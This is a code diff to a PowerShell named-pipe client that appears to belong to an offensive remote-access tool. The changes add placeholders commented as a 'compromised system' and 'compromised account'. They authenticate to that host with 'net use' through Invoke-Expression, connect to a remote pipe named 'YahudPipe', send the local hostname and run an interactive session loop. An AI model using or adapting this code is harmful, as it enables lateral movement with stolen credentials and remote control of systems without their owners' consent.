@@ -22,16 +22,24 @@
     }
 }
 
-# use net use \\[serverip] /user:[username] [password] to authenticate to the server before connecting to the Server pipe
 $pipeName = "YahudPipe"
-$pipeServer = "192.168.101.3"
-$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName)
+# Compromised system
+$pipeServer = ""
+# Compromised account
+$username = ""
+$password = ""
+# Authenticate to the server before connecting to the Server pipe
+$auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
+Invoke-Expression -Command $auth
+
+$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($pipeServer, $pipeName)
 Write-Host "Attempting to connect to the pipe..."
 $pipeClient.Connect();
 Write-Host "Connected."
 $sw = New-Object System.IO.StreamWriter($pipeClient)
 $sr = New-Object System.IO.StreamReader($pipeClient)
-$sw.WriteLine("Olivier")
+$hostname = Invoke-Expression -Command "hostname"
+$sw.WriteLine($hostname)
 $sw.AutoFlush = $true # Without autoflush, buffer will flush when the pipe is close, autoflush is necessary for interactive session
 $status = "0"
 
@@ -81,4 +89,3 @@ while($pipeClient.IsConnected){
     }
     
 }
-
